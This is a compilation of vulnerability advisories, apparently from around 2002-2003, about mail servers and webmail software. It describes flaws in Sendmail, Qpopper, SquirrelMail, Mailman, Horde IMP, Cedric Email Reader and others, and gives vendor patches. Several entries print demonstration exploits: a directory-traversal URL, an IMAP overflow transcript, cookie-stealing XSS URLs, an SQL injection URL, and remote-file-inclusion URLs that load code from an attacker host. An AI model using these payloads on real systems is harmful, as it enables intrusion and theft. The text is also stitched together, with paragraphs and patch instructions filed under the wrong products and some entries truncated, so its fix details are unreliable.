Title: Quickfront Input Validation Flaw Discloses Files on the System to Remote Users
Description:
An input validation vulnerability was reported in the Quickfront e-mail system.  A remote user can view files on the system.
Securiteam reported that the software does not filter user-supplied input to remove '../' directory traversal characters.  A remote user can submit a specially crafted request to obtain files on the system that are located outside of the web document directory.  A demonstration exploit URL is provided:

http://<quickfront server>/../../../../../boot.ini
Impact': A remote user can obtain any file on the server that is readable by the Quickfront web service.
Solution:
The vendor has reportedly issued a fixed version (2002.0.02.0916), available at:

http://www.matriks.com/quickfront_download.html

Title: MailMax/Web Discloses Installation Path to Remote Users
Description:
Dennis Rand at Infowarefare.dk reported a vulnerability in MailMax/Web.  A remote user can determine the installation path.
It is reported that the software sets a cookie that contains the full installation path of the software.  A remote user with the ability to sniff the network between a user and the target server can determine the installation path.

An example of the cookie is provided:

Cookie: BOXLOADED=NO; MYDIR=c:\inetpub\wwwroot\mailmaxweb;
Impact': A remote user can determine the installation path of the software.
Solution: No solution was available at the time of this entry.

Title: MailMax IMAP Server Buffer Overflow in 'Login' Parameter Lets Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
Dennis Rand of Infowarefare.dk reported a buffer overflow vulnerability in SmartMax Software's MailMax e-mail server.  A remote user can cause the service to crash.  Mark Litchfield of NGSSoftware reported that a remote user can execute arbitrary code with System level privileges.
It is reported that a remote user can send a specially crafted password argument for the IMAP Login command to trigger the overflow.

A demonstration exploit transcript is provided [resulting in denial of service]:

nc 127.0.0.1 143
* OK IMAP4rev1 SmartMax IMAPMax 5 Ready
0000 CAPABILITY
* CAPABILITY IMAP4rev1
0000 OK CAPABILITY completed
0001 LOGIN "mail@mail.com" "A..[50] ..A"
0001 NO Invalid user name or password.
0001 NO Invalid user name or password.

After crashing, the service must be manually restarted to return to normal operations.
Impact': A remote user can cause the service to crash.  A remote user can execute arbitrary code with System level privileges.
Solution:
The vendor has released a fixed version (5.0.10.8) that is reportedly not vulnerable to the denial of service attack.  [Editor's note:  It is not known whether this fixed version also corrects the arbitrary code execution attack.]

The fixed version is available at:

ftp://ftp.smartmax.com/updates/MailMax 5.0/Files/

It is also reported that version 5.5 is not vulnerable to the denial of service attack.

The flaw reportedly resides in 'parseaddr.c' in a char to int variable conversion.  Data received from untrusted sources, potentially including e-mail addresses or DNS domain names, that contain extended ASCII characters and that are longer than a certain size may be able to trigger the flaw and cause code to be executed.

Title: (HP Issues Fix for MPE/iX) Sendmail Buffer Overflow in Parsing Addresses May Let Remote or Local Users Execute Arbitrary Code With Root Privileges
Description:
A buffer overflow vulnerability was reported in Sendmail in the address parsing code. On UNIX, a remote or local user could cause arbitrary code to be executed with root privileges.  HP reports that on MPE/iX, the vulnerability allows a remote user to cause sendmail to terminate but not to execute arbitrary code.
The flaw reportedly resides in 'parseaddr.c' in a char to int variable conversion.  Data received from untrusted sources, potentially including e-mail addresses or DNS domain names, that contain extended ASCII characters and that are longer than a certain size may be able to trigger the flaw and cause code to be executed.

The vendor is reporting this as a "critical security problem."

The vendor credits Michal Zalewski for reporting the flaw.
Impact': A remote user could cause the sendmail process to terminate.
Solution:
HP has released patches for MPE/iX:

         MPE/iX    7.5   SMLHD16A
         MPE/iX    7.0   SMLHD15A (if SMLGDT8A is installed)
         MPE/iX    6.5 (and earlier) SMLGDT8A, then SMLHD15A

For 6.0 or 6.5 users, install the full 7.0 SMLGDT8A patch and then install SMLHD15A.  According to HP, the SMLGDT8A/SMLHD15A patch combination will function properly on MPE 6.0 and 6.5, but requires manual installation.  See the Source Message for installation instructions.

Title: (HP Issues Fix for Tru64) Sendmail Buffer Overflow in Parsing Addresses May Let Remote or Local Users Execute Arbitrary Code With Root Privileges
Impact: Execution of arbitrary code via local system
Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in Sendmail in the address parsing code.  A remote or local user could cause arbitrary code to be executed with root privileges.
The flaw reportedly resides in 'parseaddr.c' in a char to int variable conversion.  Data received from untrusted sources, potentially including e-mail addresses or DNS domain names, that contain extended ASCII characters and that are longer than a certain size may be able to trigger the flaw and cause code to be executed.

The vendor is reporting this as a "critical security problem."

The vendor credits Michal Zalewski for reporting the flaw.
Impact': A remote or local user could cause arbitrary code to be executed with root privileges.
Solution:
HP has released Early Release Patches (ERPs) for Tru64 UNIX.  These ERP kits reportedly have file intersections with the previously reported SSRT3469 sendmail advisory.  The ERPs reportedly contain the corrections in SSRT3469 and can be installed standalone or over the previous SSRT3469 patch kits.

Prerequisite: V5.1B with PK1 (BL1) installed
ERP Kit Name : T64V51BB1-C0008000-17812-ES-20030403.tar

HP Tru64 UNIX/TruCluster Server 5.1A

Data received from untrusted sources, potentially including e-mail addresses or DNS domain names, that contain extended ASCII characters and that are longer than a certain size may be able to trigger the flaw and cause code to be executed.

NetBSD-current:

Systems running NetBSD-current dated from before 2003-03-30 should be upgraded to NetBSD-current dated 2003-03-31 or later.

The following directories need to be updated from the netbsd-current CVS branch (aka HEAD):
		gnu/dist/sendmail/sendmail

To update from CVS, re-build, and re-install sendmail:
		# cd src
		# cvs update -d -P gnu/dist/sendmail/sendmail
		# cd gnu/usr.sbin/sendmail

		# make USETOOLS=no cleandir dependall
		# make USETOOLS=no install


NetBSD 1.6:

The binary distribution of NetBSD 1.6 is vulnerable.   Systems running NetBSD 1.6 sources dated from before 2003-03-30 should be upgraded from NetBSD 1.6 sources dated 2003-03-31 or later.

NetBSD 1.6.1 will include the fix.

The following directories need to be updated from the netbsd-1-6 CVS branch:
		gnu/dist/sendmail/sendmail

To update from CVS, re-build, and re-install sendmail:

		# cd src
		# cvs update -d -P -r netbsd-1-6 gnu/dist/sendmail/sendmail
		# cd gnu/usr.sbin/sendmail

		# make USETOOLS=no cleandir dependall
		# make USETOOLS=no install


NetBSD 1.5, 1.5.1, 1.5.2, 1.5.3:

The binary distribution of NetBSD 1.5.3 is vulnerable.   

Systems running NetBSD 1.5, 1.5.1, 1.5.2, or 1.5.3 sources dated from before 2003-04-01 should be upgraded from NetBSD 1.5.* sources dated 2003-04-02 or later.

The following directories need to be updated from the netbsd-1-5 CVS branch:
		gnu/dist/sendmail/sendmail

To update from CVS, re-build, and re-install sendmail:

		# cd src
		# cvs update -d -P -r netbsd-1-5 gnu/dist/sendmail/sendmail
		# cd gnu/usr.sbin/sendmail

		# make cleandir dependall
		# make install

Title: DeskNow Web Mail Uses Clear Text Authentication for Web Mail Access
Description:
Dennis Rand at Infowarfare.dk reported a vulnerability in Ventia's DeskNow communications server.  The system uses clear text authentication.
It is reported that the Web Mail login requires the username and password to be sent via the network without encryption.  A remote user with access to the target user's or target server's traffic stream can view passwords.
Impact': The system discloses passwords to users that are sniffing the network.
Solution: No solution was available at the time of the entry.  The vendor is working on a fix.

Title: (HP Issues Fix for MPE/iX) Sendmail Buffer Overflow in Parsing Certain Header Comments May Let Remote Users Execute Arbitrary Code with Root Privileges
Impact: Execution of arbitrary code via local system
Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in the Sendmail mail transfer agent (MTA).  A remote user could execute arbitrary code with the privileges of the mail server (typically root privileges)
It is reported that the software contains an exploitable buffer overflow in the parsing of certain SMTP header elements.  The report indicates that long sender or recipient header comments may trigger the flaw.  A remote user could create a specially crafted message to cause arbitrary code to be executed on the target server.  The target server could be the sending MTA, an intermediate MTA, or the destination MTA.

The vendor has labeled this bug as a "critical security problem."

The vendor credits Mark Dowd of ISS X-Force with reporting the flaw.

Another buffer overflow was reported in the processing of RFC 1413 ident protocol messages (this was discovered by a different user).  According to the vendor, this is "non-exploitable."
Impact': A remote user could execute arbitrary code with the privileges of the target server, which is typically root privileges.  Any MTA processing the message may be affected.
Solution:
HP has released a fix for MPE/iX sendmail:

MPE/iX 7.5  SMLHD04A
MPE/iX 7.0  SMLHD03A

For MPE/iX 6.5 (and earlier), where sendmail is not officially supported, HP notes that the SENDMAIL NMPRG within SMLHD03A or SMLHD04A will work for unsupported freeware versions.

HP advises that you download and unpack SMLHD03A or SMLHD04A and then manually copy the new SENDMAIL NMPRG into the appropriate group in the SENDMAIL account.

Title: (OpenBSD Issues Fix) Sendmail Buffer Overflow in Parsing Addresses May Let Remote or Local Users Execute Arbitrary Code With Root Privileges
Impact: Execution of arbitrary code via local system
Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in Sendmail in the address parsing code.  A remote or local user could cause arbitrary code to be executed with root privileges.
The flaw reportedly resides in 'parseaddr.c' in a char to int variable conversion.  Data received from untrusted sources, potentially including e-mail addresses or DNS domain names, that contain extended ASCII characters and that are longer than a certain size may be able to trigger the flaw and cause code to be executed.

The vendor is reporting this as a "critical security problem."

The vendor credits Michal Zalewski for reporting the flaw.
Impact': A remote or local user could cause arbitrary code to be executed with root privileges.
Solution:
The vendor has issued a fix in OpenBSD-current (and OpenBSD 3.3), which includes the fixed version 8.12.9.

Patches have been applied to the -stable branches.  The vendor notes that because the -stable branches have the vulnerability fix but do not have the full 8.12.9 distribution, sendmail running on a -stable implementation will report the old sendmail version.

Patch for OpenBSD 3.1:

ftp://ftp.openbsd.org/pub/OpenBSD/patches/3.1/common/027_sendmail.patch

Patch for OpenBSD 3.2:

ftp://ftp.openbsd.org/pub/OpenBSD/patches/3.2/common/014_sendmail.patch

The vendor credits Michal Zalewski for reporting the flaw.

Solution:
FreeBSD has released a fix and provides the following options:

1) Upgrade your vulnerable system to 4-STABLE or 4.8-RELEASE; or to the RELENG_5_0, RELENG_4_7, or RELENG_4_6 security branch dated after the correction date (5.0-RELEASE-p7, 4.7-RELEASE-p10, or 4.6.2-RELEASE-p13, respectively).

2) To patch your present system:

The following patch has been verified to apply to FreeBSD 5.0, 4.7, and 4.6 systems.

a) Download the relevant patch from the location below, and verify the detached PGP signature using your PGP utility.

ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-03:07/sendmail.patch
ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-03:07/sendmail.patch.asc

b) Execute the following commands as root:

# cd /usr/src
# patch < /path/to/patch
# cd /usr/src/lib/libsm
# make obj && make depend && make
# cd /usr/src/lib/libsmutil
# make obj && make depend && make
# cd /usr/src/usr.sbin/sendmail
# make obj && make depend && make && make install

c) Restart sendmail.  Execute the following command as root.

# /bin/sh /etc/rc.sendmail restart

Title: Qpopper E-mail Server Authentication Timing Discloses Whether a Requested Username is Valid or Not
Description:
An information disclosure vulnerability was reported in the Qualcomm Qpopper POP3 e-mail server.  A remote user can determine whether specific user account names are valid or not.
It is reported that a remote user can request authentication for a specific username and, based on the timing of the response from the server, determine whether the username exists on the server.  The system will reportedly wait approximately 10 seconds to respond to a request with a valid username with an invalid password.  In contrast, the system will reportedly respond immediately to a request with an invalid username.

A remote user can measure the timing of server reponses to scan for valid usernames on the server.

A demonstration exploit is provided in the Source Message [it is Base64 encoded].
Impact': A remote user can determine whether a username exists or does not exist on the mail server.
Solution: No solution was available at the time of this entry.

Title: (Caldera Issues Fix for OpenServer) Sendmail Buffer Overflow in Parsing Certain Header Comments May Let Remote Users Execute Arbitrary Code with Root Privileges
Impact: Execution of arbitrary code via local system
Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in the Sendmail mail transfer agent (MTA).  A remote user could execute arbitrary code with the privileges of the mail server (typically root privileges)
It is reported that the software contains an exploitable buffer overflow in the parsing of certain SMTP header elements.  The report indicates that long sender or recipient header comments may trigger the flaw.  A remote user could create a specially crafted message to cause arbitrary code to be executed on the target server.  The target server could be the sending MTA, an intermediate MTA, or the destination MTA.

The vendor has labeled this bug as a "critical security problem."

The vendor credits Mark Dowd of ISS X-Force with reporting the flaw.

Another buffer overflow was reported in the processing of RFC 1413 ident protocol messages (this was discovered by a different user).  According to the vendor, this is "non-exploitable."
Impact': A remote user could execute arbitrary code with the privileges of the target server, which is typically root privileges.  Any MTA processing the message may be affected.

Title: (Debian Issues Fix) Qpopper POP3 Mail Server Buffer Overflow May Let Remote Authenticated Users Execute Arbitrary Code on the Server
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in Qualcomm's Qpopper e-mail server.  A remote authenticated user may be able to execute arbitrary code on the system.
It is reported that the software uses a custom implementation of the vsnprintf() function called Qvsnprintf().  According to the report, the Qvsnprintf() function does not null-terminate long strings.  This behavior can reportedly be exploited due to a call to the function in pop_msg() (in the 'popper/pop_msg.c' file).  A remote user may be able to send specially crafted data to cause the stack to be overwritten and arbitrary code to be executed.

A demonstration exploit is available in the Source Message and another demonstration exploit is available at:

http://nstx.dereference.de/snippets/qex.c
Impact': A remote authenticated user (i.e., a user with a valid username and password) can execute arbitrary code on the server, usually under the user id (uid) of the specified user name and the 'mail' group id (gid).
Solution:
Debian has released a fix in version 4.0.4-2.woody.3 for Debian 3.0 (woody).

Title: Qpopper POP3 Mail Server Buffer Overflow May Let Remote Authenticated Users Execute Arbitrary Code on the Server
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in Qualcomm's Qpopper e-mail server.  A remote authenticated user may be able to execute arbitrary code on the system.
It is reported that the software uses a custom implementation of the vsnprintf() function called Qvsnprintf().  According to the report, the Qvsnprintf() function does not null-terminate long strings.  This behavior can reportedly be exploited due to a call to the function in pop_msg() (in the 'popper/pop_msg.c' file).  A remote user may be able to send specially crafted data to cause the stack to be overwritten and arbitrary code to be executed.

A demonstration exploit is available in the Source Message and another demonstration exploit is available at:

http://nstx.dereference.de/snippets/qex.c
Impact': A remote authenticated user (i.e., a user with a valid username and password) can execute arbitrary code on the server, usually under the user id (uid) of the specified user name and the 'mail' group id (gid).
Solution:
The vendor has released a fixed version (4.0.5), available at:

ftp://ftp.qualcomm.com/eudora/servers/unix/popper/

[Editor's note:  The fix was first introduced in version 4.0.5fc2, available at ftp://ftp.qualcomm.com/eudora/servers/unix/popper/beta/]

Title: (HP Issues Fix for VVOS) Sendmail Buffer Overflow in Parsing Certain Header Comments May Let Remote Users Execute Arbitrary Code with Root Privileges
Impact: Execution of arbitrary code via local system
Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in the Sendmail mail transfer agent (MTA).  A remote user could execute arbitrary code with the privileges of the mail server (typically root privileges)
It is reported that the software contains an exploitable buffer overflow in the parsing of certain SMTP header elements.  The report indicates that long sender or recipient header comments may trigger the flaw.  A remote user could create a specially crafted message to cause arbitrary code to be executed on the target server.  The target server could be the sending MTA, an intermediate MTA, or the destination MTA.

The vendor has labeled this bug as a "critical security problem."

The vendor credits Mark Dowd of ISS X-Force with reporting the flaw.

Another buffer overflow was reported in the processing of RFC 1413 ident protocol messages (this was discovered by a different user).  According to the vendor, this is "non-exploitable."
Impact': A remote user could execute arbitrary code with the privileges of the target server, which is typically root privileges.  Any MTA processing the message may be affected.
Solution:
To determine if you are running a vulnerable version of sendmail, HP reports that you can login in as root and run the following command from the /usr/sbin directory:

sendmail -d0.1 < /dev/null | grep -i version

If this commands displays version 8.7.x, 8.8.6, 8.9.3, or 8.11.1, you are reportedly affected.

HP has issued the following fixes:

For HP-UX 10.20:

If you are running 8.8.6 on HP-UX 10.20, upgrade to 8.9.3 by by installing PHNE_25183, then apply sendmail.893.10.20.

For HP-UX 11.00:

If you are running 8.8.6 on HP-UX 11.00, upgrade to 8.9.3 by by installing PHNE_24419, then apply sendmail.893.11.00.

OR

Upgrade to 8.11.1 by installing the web upgrade, available at:

http://www.software.hp.com

Then apply sendmail.811.11.00.

For VVOS 11.04 (Virtual Vault Operating System):

If you are running 8.7.x or 8.8.6 on VVOS 11.04, upgrade to 8.9.3 by installing PHNE_25984, then apply sendmail.893.11.00.

If you are already running sendmail 8.9.3 on VVOS 11.04, apply sendmail.893.11.00.

HP reports that VVOS does not support the web upgrade version of sendmail 8.11.1.

Title: Sun Solaris sendmail '.forward' Bug May Let Local Users Deny Service or Gain Root Privileges
Impact: Denial of service via local system
Description:
A vulnerability was reported in Sun sendmail(1M) in the processing of '.forward' files.  A local user may be able to deny service on the mail server.  A local user may also be able to gain root privileges on the system.
Sun reported that Sun sendmail(1M) does not properly handle some ".forward" constructs.  No further details were provided.

Solaris 7, 8, and 9 are affected.  Sun reports that Solaris 2.6 is not affected.
Impact': A local user may be able to deny service to the mail server.  A local user may be able to obtain root privileges on the system.
Solution:
Sun has issued the following patches:

SPARC Platform 

Solaris 7 with patch 107684-06 or later 
Solaris 8 with patch 110615-07 or later 
Solaris 9 with patch 113575-02 or later 

x86 Platform 

Solaris 7 with patch 107685-06 or later 
Solaris 8 with patch 110616-07 or later 
Solaris 9 with patch 114137-01 or later 

Once the patch has been installed, Sun indicates that you must restart sendmail with the following commands:

	# /etc/init.d/sendmail stop
	# /etc/init.d/sendmail start

Sun describes a workaround involving modifying the *.mc file and generating a new sendmail.df file.  See the Vendor URL for specific instructions.

Title: (Red Hat Issues Fix) SquirrelMail Input Validation Flaw in 'read_body.php' Lets Remote Users Conduct Cross Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in a component of SquirrelMail.  A remote user can conduct cross-site scripting attacks against SquirrelMail users.
It is reported that the 'read_body.php' script does not filter user-supplied HTML from the 'mailbox' and 'passed_id' variables. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the SquirrelMail software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. 

A demonstration exploit is provided:

http://hostname/src/read_body.php?mailbox=
%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&passed_id=
%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&
startMessage=1&show_more=0
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running SquirrelMail, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution:
Red Hat has released a fix.

Title: (NetBSD Issues Fix) Sendmail Buffer Overflow in Parsing Certain Header Comments May Let Remote Users Execute Arbitrary Code with Root Privileges
Impact: Execution of arbitrary code via local system
Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in the Sendmail mail transfer agent (MTA).  A remote user could execute arbitrary code with the privileges of the mail server (typically root privileges)
It is reported that the software contains an exploitable buffer overflow in the parsing of certain SMTP header elements.  The report indicates that long sender or recipient header comments may trigger the flaw.  A remote user could create a specially crafted message to cause arbitrary code to be executed on the target server.  The target server could be the sending MTA, an intermediate MTA, or the destination MTA.

The vendor has labeled this bug as a "critical security problem."

The vendor credits Mark Dowd of ISS X-Force with reporting the flaw.

Another buffer overflow was reported in the processing of RFC 1413 ident protocol messages (this was discovered by a different user).  According to the vendor, this is "non-exploitable."
Impact': A remote user could execute arbitrary code with the privileges of the target server, which is typically root privileges.  Any MTA processing the message may be affected.
Solution:
NetBSD has released a fix.

* NetBSD-current:

Systems running NetBSD-current dated from before 2003-03-04 should be upgraded to NetBSD-current dated 2003-03-04 or later.

The following directories need to be updated from the netbsd-current CVS branch (aka HEAD):
		src/gnu/dist/sendmail/sendmail

To update from CVS, re-build, and re-install sendmail:
		# cd src
		# cvs update -d -P gnu/dist/sendmail/sendmail
		# cd gnu/usr.sbin/sendmail

		# make USETOOLS=no cleandir dependall
		# cd sendmail
		# make USETOOLS=no install


* NetBSD 1.6:

Systems running NetBSD 1.6 sources dated from before 2003-03-04 should be upgraded from NetBSD 1.6 sources dated 2003-03-04 or later.

NetBSD 1.6.1 will include the fix.

The following directories need to be updated from the netbsd-1-6 CVS branch:
		src/gnu/dist/sendmail/sendmail

To update from CVS, re-build, and re-install sendmail:

		# cd src
		# cvs update -d -P -r netbsd-1-6 gnu/dist/sendmail/sendmail
		# cd gnu/usr.sbin/sendmail

                # make USETOOLS=no cleandir dependall
                # cd sendmail
                # make USETOOLS=no install


* NetBSD 1.5, 1.5.1, 1.5.2, 1.5.3:

Systems running NetBSD 1.5, 1.5.1, 1.5.2, or 1.5.3 sources dated from before 2003-03-04 should be upgraded from NetBSD 1.5.* sources dated 2003-03-04 or later.

The following directories need to be updated from the netbsd-1-5 CVS branch:
		src/gnu/dist/sendmail

To update from CVS, re-build, and re-install sendmail:

		# cd src
		# cvs update -d -P -r netbsd-1-5 gnu/dist/sendmail/sendmail
		# cd gnu/usr.sbin/sendmail

                # make USETOOLS=no cleandir dependall
                # cd sendmail
                # make USETOOLS=no install
Underlying OS Comments: NetBSD 1.6, 1.5.3, 1.5.2, 1.5.1, 1.5, and NetBSD-currentsource prior to March 4, 2003

Title: (SuSE Issues Fix) Hypermail Buffer Overflow Lets Remote Users Execute Arbitary Code
Impact: Execution of arbitrary code via network
Description:
Several buffer overflow vulnerabilities were reported in the Hypermail web-based mail system.  A remote user can execute arbitrary code on the system.
It is reported that a remote user can send a specially crafted e-mail message with a long attachment file name (252 characters) to a target user that has an account on a Hypermail system to trigger a buffer overflow.  The overflow can reportedly be triggered when Hypermail is in a certain configuration (option progress set to 2).  The overflow resides in the parsemail() function in the 'parse.c' file and allows the remote user to execute arbitrary code on the system with the privileges of the Hypermail process.

According to the report, there are other buffer overruns in the parsemail() function, but those may not be exploitable.

It is also reported that the 'mail' CGI component of Hypermail contains a flaw.  A buffer overflow can be triggered when a reverse DNS lookup is performed if the hostname returned is 122 characters.  A remote user with control of a DNS server or the ability to spoof the DNS can supply a specially crafted hostname value to cause arbitrary code to be executed by the mail CGI script.

Finally, the mail CGI program can also be invoked by remote users to send e-mail to arbitrary recipients.
Impact': A remote user can execute arbitrary code on the system with the privileges of the Hypermail system or with the privileges of the web server.  A remote user can send arbitrary e-mail to arbitrary recipients via the server.
Solution:
SuSE has released a fix.

Title: ISMail Mail Server Buffer Overflow in Processing Certain SMTP Commands Lets Remote Users Execute Arbitrary Code with System Privileges
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in the ISMail mail server.  A remote user can cause denial of service conditions or can execute arbitrary code with System privileges.
NGSSoftware reported that a remote user can supply a specially crafted domain name value in the 'mail from' or 'rcpt to' fields to overwrite the saved returned return address on the stack and cause the system to crash or to execute arbitrary code.  The code will reportedly run with Local System privileges.  According to the report, if no code is provided the system will crash and will leave a file containing the malicious domain name in the outgoing message folder, immediately triggering the crash again when ISMail is restarted.  This will result in denial of service conditions.
Impact': A remote user can cause the server to execute arbitrary code with Local System privileges.  A remote user can also cause the server to crash repeatedly.
Solution:
The vendor has released a fixed version (1.4.5) that reportedly fixes the flaw and limits domain names to 255 characters.  Any domain name that is longer will yield a '501 Syntax error in parameters' response from the server.  The fixed version is available at:

http://instantservers.com/download/ism145.exe
http://instantservers.com/downloads.html

NGSSoftware reports that the vendor issued a patch within 48 hours of notification.

Title: Ecartis List Management Software Lets Remote Authenticated Users Change the Password of Other Users
Description:
An authentication vulnerability was reported in the Ecartis e-mail list management software.  A remote authenticated user can change the password of arbitrary users on the system.
It is reported that the software allows a remote authenticated user to change the password of any target user, including administrative users, without having to supply the existing password of the target user.  This can reportedly be achieved by modifying the 'hidden' HTML form fields that contain the username to reference the desired target username and then submitting the form to the server.
Impact': A remote authenticated user can change the password of any target user on the system and can then access the target user's configuration.
Solution: No solution was available at the time of this entry.

Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in the Horde Internet Messaging Program (IMP).  A remote user can inject SQL commands to be executed by the underlying database.
It is reported that the flaw resides in some of the database functions named lib/db.<databasename>. A remote user can submit specially crafted URLs that include SQL commands that will be executed by IMP's underlying database.  A demonstration exploit URL is provided:

"http://webmail.server/imp/mailbox.php3?actionID=6&server=x&imapuser=x';somesql+--&pass=x"

According to the report, the SQL query results are not displayed directly.
Impact': Depending on the SQL database configuration, a remote user may be able to execute complete SQL queries on the database and read from or write to the database.
Solution:
SuSE has released a fix.

Title: (Gentoo Issues Fix) Re: Mailman List Software Input Validation Flaw in 'email' Variable Allows Remote Users to Conduct Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in the Mailman mailing list distribution software.  A remote user can conduct cross-site scripting attacks against Mailman users and administrators.
It is reported that the 'email' variable on the web interface is not properly filtered to remove HTML code from user-supplied input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Mailman web interface and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A demonstration exploit URL is provided:

https://[target]:443/mailman/options/yourlist?
language=en&email=<SCRIPT>alert('Can%20Cross%20Site%20Attack')</SCRIPT>

It is also reported that the default error page does not properly filter user-supplied input.  A demonstration exploit URL is provided:

https://[target]:443//mailman/options/yourlist?
language=<SCRIPT>alert('Can%20Cross%20Site%20Attack')</SCRIPT>
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Mailmain software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution:
Gentoo Linux has issued a fix.  The vendor recommends that all Gentoo Linux users who are running net-mail/mailman upgrade to mailman-2.1.1 as follows:

emerge sync
emerge -u mailman
emerge clean

Title: (Debian Issues Fix) Hypermail Buffer Overflow Lets Remote Users Execute Arbitary Code
Impact: Execution of arbitrary code via network
Description:
Several buffer overflow vulnerabilities were reported in the Hypermail web-based mail system.  A remote user can execute arbitrary code on the system.
It is reported that a remote user can send a specially crafted e-mail message with a long attachment file name (252 characters) to a target user that has an account on a Hypermail system to trigger a buffer overflow.  The overflow can reportedly be triggered when Hypermail is in a certain configuration (option progress set to 2).  The overflow resides in the parsemail() function in the 'parse.c' file and allows the remote user to execute arbitrary code on the system with the privileges of the Hypermail process.

According to the report, there are other buffer overruns in the parsemail() function, but those may not be exploitable.

It is also reported that the 'mail' CGI component of Hypermail contains a flaw.  A buffer overflow can be triggered when a reverse DNS lookup is performed if the hostname returned is 122 characters.  A remote user with control of a DNS server or the ability to spoof the DNS can supply a specially crafted hostname value to cause arbitrary code to be executed by the mail CGI script.

Finally, the mail CGI program can also be invoked by remote users to send e-mail to arbitrary recipients.
Impact': A remote user can execute arbitrary code on the system with the privileges of the Hypermail system or with the privileges of the web server.  A remote user can send arbitrary e-mail to arbitrary recipients via the server.

Debian has released the following fixes:

Title: Cedric Email Reader (Webmail) Include File Bug Lets Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
An include file vulnerability was reported in the Cedric Email Reader webmail software.  A remote user can execute arbitrary code on the target server.
It is reported that the file 'email.php3' (in version 0.2) or 'email.php' (in version 0.3) includes the '$cer_skin' variable but does not ensure that the variable is appropriately defined.

A remote user can create a specially crafted URL that specifies a remote file location for the $cer_skin variable to cause that remotely located file to be included and executed on the target server.  A demonstration exploit URL is provided:

http://[target]/email.php?login=attacker&cer_skin=http://[attacker]/code.php 

This will cause the 'http://[attacker]/code.php' file to be executed on the target server with the privileges of the target server's web daemon.

It is reported that in version 0.4, the 'webmail/lib/emailreader_execute_on_each_page.inc.php' file includes the '$emailreader_ini' variable.  A remote user can specify a remote location for the variable to cause arbitrary code to be executed.

A demonstration exploit URL is provided:

http://[target]/webmail/lib/emailreader_execute_on_each_page.inc.php?emailreader_ini=http://[attacker]/code.php

http://[attacker]/code.php on remote server

These vulnerabilities can also reportedly be used to include local files.

Both of these vulnerabilities apply only if the registers_global configuration is on.
Impact': A remote user can execute arbitrary PHP code and system commands on the target server with the privileges of the target server's web daemon.
Solution: No solution was available at the time of this entry.

Title: Alt-N WorldClient Default CGI Configuration Lets Remote Users Send Forged Mail Via the Server
Description:
AK Hooja reported a vulnerability in the Alt-N's WorldClient web-based e-mail client.  A remote user can relay mail with forged headers via the embedded MDaemon mail server.
It is reported that the default cgibase configuration (Form2Raw.cgi) allows a remote user to submit a specially crafted HTML form to send forged e-mail via the MDaemon server.
Impact': A remote user can send forged mail via the mail server.
Solution:
No vendor solution was available at the time of this entry.

The author of the report has indicated that, as a workaround, you can remove the cgibase2 config statement from the Worldclient.ini file:

CgiBase2=/Form2Raw.cgi
CgiFile2=C:\MDaemon\CGI\Form2Raw.exe

Title: IlohaMail Input Validation Bug Lets Remote Authenticated Users Upload Files to the Server
Description:
A vulnerability was reported in the IlohaMail webmail server.  A remote authenticated user can upload files to the system.
It is reported that IlohaMail does not properly validate the user-supplied upload path for file attachments when a user composes a message.  A remote authenticated user can upload a file to arbitrary locations, subject to the privileges of the web server.  This can reportedly be used to overwrite files, as well.
Impact': A remote authenticated user can upload files to and overwrite files on the system with the privileges of the web server.
Solution:
The vendor has released a fixed version (0.7.9), available at:

http://ilohamail.org/main.php?page=Downloads

Title: Majordomo Mailing List Default Configuration Discloses List E-mail Addresses to Remote Users
Description:
An information disclosure vulnerability was reported in Majordomo.  A remote user may be able to extract subscriber e-mail addresses from the server.
It is reported that if the 'which_access' setting is set to 'open' (the default configuration), then a remote user can view e-mail addresses subscribed to lists on the server.

The report indicates that an administrator must take explicit steps to prevent remote users from executing the "who", "which", "index", and "get" commands against a list.

A remote user can send one of the following commands to the server to receive a listing of all matching e-mail addresses:

which @
which .

This will cause the Majordomo application to return any addresses containing the specified character ('@' or '.' in this example), according to the report.
Impact': A remote user can view the e-mail addresses on a particular Majordomo mailing list.
Solution:
The vendor has released a fixed version (Majordomo 2) that has a default configuration setting of "closed".  The fixed version is available via CVS.  For information about obtaining the fixed version, see:

http://www.math.uh.edu/majordomo/

For Majordomo versions 1.94.5 and earlier, you can create an empty file named "$listname.private" in the $listdir (as described in the documentation).  This will reportedly restrict the set of users that can retrieve the address information to users that are subscribed to the list.  Also, you can change any open 'which_access' configuration settings to 'closed'.

An unofficial patch for Majordomo 1.94.5 is provided in the Source Message.

Title: Hypermail Buffer Overflow Lets Remote Users Execute Arbitary Code
Impact: Execution of arbitrary code via network
Description:
Several buffer overflow vulnerabilities were reported in the Hypermail web-based mail system.  A remote user can execute arbitrary code on the system.
